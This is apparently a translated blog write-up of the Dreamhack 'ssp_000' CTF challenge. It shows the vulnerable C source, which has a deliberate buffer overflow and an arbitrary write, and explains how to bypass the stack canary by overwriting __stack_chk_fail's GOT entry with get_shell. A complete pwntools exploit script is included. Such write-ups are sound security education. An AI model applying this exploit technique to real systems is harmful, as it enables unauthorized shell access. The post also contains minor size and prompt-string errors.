# dreamhack.io: ssp_000

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224314186381). Translated and reformatted in English.

chaeeun@chaeeuns-MacBook-Air b93fb9e8-f75a-4aa0-99da-a59711cd7602 % checksec ./ssp_000
[*] '/Users/chaeeun/Desktop/b93fb9e8-f75a-4aa0-99da-a59711cd7602/ssp_000'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
 Stripped: No
chaeeun@chaeeuns-MacBook-Air b93fb9e8-f75a-4aa0-99da-a59711cd7602 % cat ssp_000.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
 puts("TIME OUT");
 exit(-1);
}


void initialize() {
 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 signal(SIGALRM, alarm_handler);
 alarm(30);
}

void get_shell() {
 system("/bin/sh");
}

int main(int argc, char *argv[]) {
 long addr;
 long value;
 char buf[0x40] = {};

 initialize();


 read(0, buf, 0x80);

 printf("Addr : ");
 scanf("%ld", &addr);
 printf("Value : ");
 scanf("%ld", &value);

 *(long *)addr = value;

 return 0;
}

There are carnary, nx, and partial relro. The buffer received is 40, but the buffer that can be put in is 80. It could be a buffer overflow. However, because the canary protection technique is implemented, this is not possible.

However, this code cannot be canary rigged. This is because, although it overflows, buf is not output afterwards. Instead, it is a structure that can be bypassed without picking Canary. That method is arbitrary write primitive - arbitrary write vulnerability.

Since it is Partial RELRO, it is probably a problem using GOT overwrite.

1. Intentionally breaking the canary by buf overflow

2. Covering __stack_chk_fail@GOT with get_shell address by arbitrary write

3. Canary check fails when main returns

4. Call __stack_chk_fail()

5. However, GOT has been changed to get_shell, so shell execution

In other words, the method is not to leak the canary, but to bypass it by changing the canary failure routine to get_shell.

There are two values required.

addr = __stack_chk_fail@GOT

value = get_shell address

from pwn import *

p = remote("host3.dreamhack.games", 8393)
elf = ELF("./ssp_000")

get_shell = elf.symbols["get_shell"]
stack_chk_fail_got = elf.got["__stack_chk_fail"]

# Enter larger than 0x40 to intentionally break the canary
p.send(b"A" * 0x50)

p.recvuntil(b"Addr: ")
p.sendline(str(stack_chk_fail_got).encode())

p.recvuntil(b"Value : ")
p.sendline(str(get_shell).encode())

p.interactive()
